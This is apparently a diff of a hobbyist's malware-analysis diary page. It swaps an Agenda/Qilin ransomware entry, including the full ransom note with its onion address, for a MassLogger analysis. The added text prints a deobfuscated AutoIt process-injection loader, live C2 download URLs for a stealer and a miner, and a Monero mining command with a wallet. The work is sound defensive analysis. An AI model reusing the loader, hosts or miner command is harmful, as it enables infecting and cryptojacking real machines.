@@ -3,7 +3,7 @@
     <head>
         <!-- Book generated using mdBook -->
         <meta charset="UTF-8">
-        <title>Ransomware - My Analysis</title>
+        <title>Logger - My Analysis</title>
 
 
         <!-- Custom HTML head -->
@@ -155,83 +155,99 @@
 
                 <div id="content" class="content">
                     <main>
-                        <p>Note: I usually analyze malware and write randomly to remember my progress, most of my reports are not detailed and clean, it is just like a diary.</p>
-<p>Day 1:</p>
-<p>I wanted to analyze my first ransomware to learn something new and chose AgendaRansomware (I don't really know why). Anyways this is a 1.6mb rustc compiled binary. At first sight, it feels like there is no deobfuscation and easy to analyze, but later on I found out, there is something disrupting static analysis. So far I found 2 things:</p>
-<p><img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_7/1.png?raw=true" alt="1|500" /></p>
-<p><img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_7/2.png?raw=true" alt="1|500" /></p>
-<p>Ghidra can't disassemble because of these 2 additions made on malware, but luckly it is easy to fix, I will just write script to replace all of them with "NOP" and issue will (probably) going to be solved.</p>
-<p>Other than that, I found out we have to provide "--password &lt;pass&gt;"  to binary, else it will not be executed. That password is actually used later as login credential to a domain in tor network and requesting chiper/tool to decrypt files (by paying for it). Other than that, Malware also gives us logs:</p>
-<pre><code>[WARNING] Cannot open service: [BrokerInfrastructure]: 5                                                                Service [CryptSvc] stopped                                                                                              Service [CryptSvc] disabled                                                                                             Service [DoSvc] stopped                                                                                                 [WARNING] Cannot disable [DoSvc]: 5                                                                                     [WARNING] Cannot stop [netprofm]: 1061                                                                                  Service [netprofm] disabled                                                                                             [WARNING] Cannot stop [netprofm]: 1061                                                                                  Service [netprofm] disabled                                                                                             [WARNING] Cannot stop [NlaSvc]: 1051                                                                                    Service [NlaSvc] disabled                                                                                               [WARNING] Cannot stop [EventLog]: 1051                                                                                  Service [EventLog] disabled                                                                                             [WARNING] Cannot open service: [gpsvc]: 5                                                                               [WARNING] Cannot open service: [MDCoreSvc]: 5                                                                           [WARNING] Cannot open service: [mpssvc]: 5                                                                              [WARNING] Cannot stop [netprofm]: 1061                                                                                  Service [netprofm] disabled                                                                                             [WARNING] Cannot stop [NlaSvc]: 1051                                                                                    Service [NlaSvc] disabled 
+                        <p>MassLogger, an information-stealing malware designed to capture credentials, keystrokes, and clipboard data from victims, has been gaining prevalence in the threat landscape, with campaigns of various sizes and victimology observed worldwide. (Yes I copied this from broadcom lol)</p>
+<p>Anyways, as usual I was on <a href="https://bazaar.abuse.ch/browse/">MalwareBazaar</a>, wishing to find a fresh malware and the one that caught my eye was the MassLogger tagged bat file.</p>
+<p><img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_8/1.png?raw=true" alt="1|1000" /></p>
+<p>There are more example MassLogger executables uploaded by <a href="https://bazaar.abuse.ch/user/1700/">lowmal3</a>, but I chose this one to analyze, because others were almost same thing and some of them were .Net executables, which is old technique used by MassLogger.</p>
+<p>This is the malware flow I made while analyzing the malware:</p>
+<p><img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_8/2.png?raw=true" alt="1|700" /></p>
+<p>NOTE: To make it clear, all these executables are injected into different legit applications and executed as new thread. i don't want to repeat it every time.
+At the top you can see a binary file named "sqNnY.bin", it will be our main target in this analysis but before that I want to tell what the other exe files does first. Starting from decrypted "aLlTeucWnrhechxHC.bin", first checks for debugger and simple VM detection (it is too easy to detect and bypass).
+Next "installer" is downloaded and executed, it drops new files and executes the au3 file. Last au3 file was most obfuscated one but it is not really difficult to deobfuscate it:</p>
+<pre><code class="language-au3">#cs
+$vkkiihtobf = \nwekwowlwhwcogczoft
+$nticu = C:\Windows\System32\charmap.exe
+$cwipirw = kernel32.dll
+$gsnfwdmcztclwcovhkqgi = OpenProcess
+$gdixmilpmsosbp = VirtualAllocEx
+$jecokuozjfa = WriteProcessMemory
+$nhybphxljwzq = CreateRemoteThread
+$rjhkweazp = CloseHandle
+$fosxprdysmayinrykddwmelktkhpm = handle
+$zixjs = dword
+$xkitfxhddsbtsyuxw = bool
+$lbcideknmrnsazvfazvjqox = ptr
+$gbjoxnfcmfxrj = ulong_ptr
+$gejrlpqkrcxnxubmbxdu = struct*
+$buwqyl = dword*
+$gvbdvltraydirvkh = byte[
+$kplaadznpnfjmbmdfevat = ]
+$mbklctvdfrnfgjakgsbqgx = 0x1F0FFF
+$hnxremrogwsdjpoags = 0x3000
+$invhvdcuydydlonc = 0x40
+#ce
+
+Global $pjbhqshpkkrdxsjiyzikstcp = FileOpen(@ScriptDir &amp; $vkkiihtobf, 16)
+Global $ewwhytiyydkuc = FileRead($pjbhqshpkkrdxsjiyzikstcp)
+FileClose($pjbhqshpkkrdxsjiyzikstcp)
+
+Global $mkzfc = BinaryLen($ewwhytiyydkuc)
+If $mkzfc = 0 Then Exit
+
+Global $mleqiqnnnbwglgehhkicmgaklppajh = DllStructCreate($gvbdvltraydirvkh &amp; $mkzfc &amp; $kplaadznpnfjmbmdfevat)
+DllStructSetData($mleqiqnnnbwglgehhkicmgaklppajh, 1, $ewwhytiyydkuc)
+For $rpmvy = 1 To $mkzfc
+    DllStructSetData($mleqiqnnnbwglgehhkicmgaklppajh, 1, BitXOR(DllStructGetData($mleqiqnnnbwglgehhkicmgaklppajh, 1, $rpmvy), 185), $rpmvy)
+Next
+
+Global $yapoagjwmurj = Run($nticu, "", @SW_HIDE)
+Global $lshbtrvzmznfktftandgtxfwse = DllCall($cwipirw, $fosxprdysmayinrykddwmelktkhpm, $gsnfwdmcztclwcovhkqgi, $zixjs, $mbklctvdfrnfgjakgsbqgx, $xkitfxhddsbtsyuxw, False, $zixjs, $yapoagjwmurj)[0]
+Global $ynvhvx = DllCall($cwipirw, $lbcideknmrnsazvfazvjqox, $gdixmilpmsosbp, $fosxprdysmayinrykddwmelktkhpm, $lshbtrvzmznfktftandgtxfwse, $lbcideknmrnsazvfazvjqox, 0, $gbjoxnfcmfxrj, $mkzfc, $zixjs, $hnxremrogwsdjpoags, $zixjs, $invhvdcuydydlonc)[0]
+
+DllCall($cwipirw, $xkitfxhddsbtsyuxw, $jecokuozjfa, $fosxprdysmayinrykddwmelktkhpm, $lshbtrvzmznfktftandgtxfwse, $lbcideknmrnsazvfazvjqox, $ynvhvx, $gejrlpqkrcxnxubmbxdu, $mleqiqnnnbwglgehhkicmgaklppajh, $gbjoxnfcmfxrj, $mkzfc, $lbcideknmrnsazvfazvjqox, 0)
+Global $zsingslima = DllCall($cwipirw, $fosxprdysmayinrykddwmelktkhpm, $nhybphxljwzq, $fosxprdysmayinrykddwmelktkhpm, $lshbtrvzmznfktftandgtxfwse, $lbcideknmrnsazvfazvjqox, 0, $gbjoxnfcmfxrj, 0, $lbcideknmrnsazvfazvjqox, $ynvhvx, $lbcideknmrnsazvfazvjqox, 0, $zixjs, 0, $buwqyl, 0)[0]
+
+If $zsingslima Then DllCall($cwipirw, $xkitfxhddsbtsyuxw, $rjhkweazp, $fosxprdysmayinrykddwmelktkhpm, $zsingslima)
+DllCall($cwipirw, $xkitfxhddsbtsyuxw, $rjhkweazp, $fosxprdysmayinrykddwmelktkhpm, $lshbtrvzmznfktftandgtxfwse)
 </code></pre>
-<p>And more, like which file it encrypted etc.</p>
-<p>README-RECOVER-&lt;extension&gt;.txt contains this:</p>
-<pre><code>-- Qilin
-
-Your network/system was encrypted.
-Encrypted files have new extension.
-
--- Compromising and sensitive data
-
-We have downloaded compromising and sensitive data from you system/network
-If you refuse to communicate with us and we do not come to an agreementyour data will be published.
-Data includes:
-    - Employees personal dataCVsDLSSN.
-    - Complete network map including credentials for local and remote services.
-    - Financial information including clients databillsbudgetsannual reportsbank statements.
-    - Complete datagrams/schemas/drawings for manufacturing in solidworks format
-    - And more...
-
--- Warning
-
-1) If you modify files - our decrypt software won't able to recover data
-2) If you use third party software - you can damage/modify files (see item 1)
-3) You need cipher key / our decrypt software to restore you files.
-4) The police or authorities will not be able to help you get the cipher key. We encourage you to consider your decisions.
-
--- Recovery
-
-1) Download tor browser: https://www.torproject.org/download/
-2) Go to domain
-3) Enter credentials
-
-
--- Credentials
-
-Extension: MmXReVIxLV
-Domain: ueegj65kwr3v3sjhli73gjtmfnh2uqlte3vyg2kkyqq7cja2yx2ptaad.onion
-login: 6f031ccd-526a-4806-82a8-2e7d926243d4 
-password: test
-
+<p>Comment section is added by me and removed other decryption parts to make it clear. this au3 will execute our last exe file named "nwekwowlwhwcogczoft".</p>
+<p>"nwekwowlwhwcogczoft" is simple C2 that can do 3 things "exit", "update", "stealer".</p>
+<p>Simple and clear flow:</p>
+<ol>
+<li>Checks if "Software\rub" registry is written, if it is not created, tries to download "http://176.98.187.46:1778/stealer"</li>
+<li>Checks if the size of "stealer" more than 1000000, if yes, executing it. else pass.</li>
+<li>if "Software\rub" was not created, creates it.</li>
+<li>Checks if a file named "paygab" exists in %LOCALAPPDATA%, if so, xor it with "0x60" and execute it.</li>
+<li>if paygab doesn't exist, downloads "http://176.98.187.46:1778/miner" and executes it.</li>
+<li>miner will check if "sigverif.exe" is running, if so terminates it.</li>
+<li>Executes command:</li>
+</ol>
+<pre><code class="language-cmd">C:\\Windows\\System32\\sigverif.exe --algo=rx/0 --url=gulf.moneroocean.stream:10001 --user=47GrvVWRXX9CbpQ7WKAqR1fP1fEYJpurvj8pAkF8FcgcUJTFi5KpTAmWxv4modTHTMNXZXSxa8K8SijdVHDiAUs69xgSt MY --pass=x --threads=2"
 </code></pre>
-<p>After walking inside the binary a little bit, i found out that, "CreateThread" functions play big role in the malware, in some parts of the malware, payloads are, let's say "hidden" and malware use "CreateThread" to start execution from these address. in ghidra they are not disassembled, instead shown as "DATA". My main purpose in this malware is finding out how the files are encrypted. Additionally, malware also disables some services, choosing which files to encrpyt (by comparing with the extensions), which I might look into deeply.</p>
-<p>What I found out from dynamic analysis is, malware uses EnterCriticalSection API to check file extensions and encrypt if it doesn't get in conflict.</p>
-<p>Day 2:</p>
-<p>Alright so today I got a little bit near to success, as I found out where malware decrypts strings. And luckly it doesn't encrypt back so i can dump them all. it is going to help a lot for success.</p>
-<p><img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_7/13.png?raw=true" alt="1|800" /></p>
-<p><img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_7/4.png?raw=true" alt="1|800" /></p>
-<p>Note: I will dump as many as strings possible (all of them) and save it in a file and save in github repo.</p>
-<p>Additionally, I found out malware uses GetProcAddress to get NtWriteFile address and call it in a stealthy way. How it works is exactly like this:</p>
-<p><img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_7/5.png?raw=true" alt="1|800" /></p>
-<p>Changes function itself with "NtWriteFile" address, so next time it calls this function, it actually calls itself. Same thing was done for other functions too, like: NtReadFile, NtCreateKeyedEvent...</p>
-<p>Process of encryption:</p>
-<p>NtCreateFile: get file handle
-NtQueryInformationVolume, NtQueryInformationFile: Check the extension of file (eg. .exe) compare with blacklisted extensions and choose to encrypt or not.  The flags that can be configured before running ransomware are: skip, step, n, p, fast, accounts. In my version of agenda ransomware there is no guide on how to use them and some flags that are available in newer versions are not available to me. Example usage is this: " ./ransomware.exe --password test "skip: 10; fast" "</p>
-<p>NtCloseFile</p>
-<p>NtReadFile: Read contents, encypt them.</p>
-<p>NtWriteFile: Write encrypted content.</p>
-<p>Now, where is content encypted? in my version of agenda ransomware, function is located at <code>0x42edf0</code> which, using registers as arguments instead of stack. The decompiled function has length of around 875 lines, which is waste of time to analyze one by one. But it is the function. Additonally, analyzing this function will reveal the key itself.</p>
-<p><img src="https://github.com/basicacc/basicacc.github.io/blob/main/My_analysis/Malware_7/6.png?raw=true" alt="1|800" /></p>
+<p>(I am providing the commands but please don't run them unless you want to donate to the malware developer)</p>
+<ol start="8">
+<li>Going back to "nwekwowlwhwcogczoft", after trying these things, it checks status of our machine by using InternetOpenUrl API "http://176.98.187.46:1778/heartbeat?userID=xxxx-xxxxx-xxxxx-xxxx" (userID is your machine GUID that got fetched by this executable before from registry) and using InternetReadFile API to check if there is any new command given by C2, as I said there are 3 commands "stealer"/"custom" (same thing), "exit", "update".</li>
+<li>why "stealer/custom" can be given? because the one we downloaded before was actually decoy and size was lower than required. (why do this? to hide their project).</li>
+<li>other 2 "exit" and "update" are obvious, what they are.</li>
+</ol>
+<p>There is a few possible case in our situation:</p>
+<ol>
+<li>the fake stealer is to take time of reverse engineers/malware analysts.</li>
+<li>it only gives real stealer to trusted (real victim machines by looking at their behaviour), for example I acted different than usual machines while analysing, requesting file a lot of times without checking heartbeat etc.</li>
+</ol>
+<p>This was end of the "nwekwowlwhwcogczoft" executable.</p>
+<p>The real deal was actually, "sqNnY.bin". Fun part is, I actually thought this is trash code to take our time but it is actually, the main part of the malware. After "xor"-ing it with the key even after you check the file type, it says "not a PE file". Also there is no "MZ" at the first 2 bytes of file. After a little, let' say "OSINT", I found out the "pe to shellcode" project was used for doing this: <a href="https://github.com/hasherezade/pe_to_shellcode">pe_to_shellcode</a>. A free but powerful project.</p>
+<p>"The goal of this project is to provide a possibility to generate PE files that can be injected with minimal effort. It is inspired by Stephen Fewer's <a href="https://github.com/stephenfewer/ReflectiveDLLInjection">ReflectiveDLLInjection</a> - but the difference is that with pe2shc you can add the reflective loading stub post-compilation. Also, the header of the PE file is modified in such a way, that you can start executing the injected buffer from the very beginning - just like you would do with a shellcode. It will automatically find the stub, and continue loading the full PE."</p>
 
                     </main>
 
                     <nav class="nav-wrapper" aria-label="Page navigation">
                         <!-- Mobile navigation buttons -->
-                            <a rel="prev" href="../AgendaRansomware/empty.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                            <a rel="prev" href="../MassLogger/empty.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                 <i class="fa fa-angle-left"></i>
                             </a>
 
-                            <a rel="next prefetch" href="../MassLogger/empty.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                            <a rel="next prefetch" href="../Malware_1/empty.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                 <i class="fa fa-angle-right"></i>
                             </a>
 
@@ -241,11 +257,11 @@ NtQueryInformationVolume, NtQueryInformationFile: Check the extension of file (e
             </div>
 
             <nav class="nav-wide-wrapper" aria-label="Page navigation">
-                    <a rel="prev" href="../AgendaRansomware/empty.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
+                    <a rel="prev" href="../MassLogger/empty.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                         <i class="fa fa-angle-left"></i>
                     </a>
 
-                    <a rel="next prefetch" href="../MassLogger/empty.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
+                    <a rel="next prefetch" href="../Malware_1/empty.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                         <i class="fa fa-angle-right"></i>
                     </a>
             </nav>
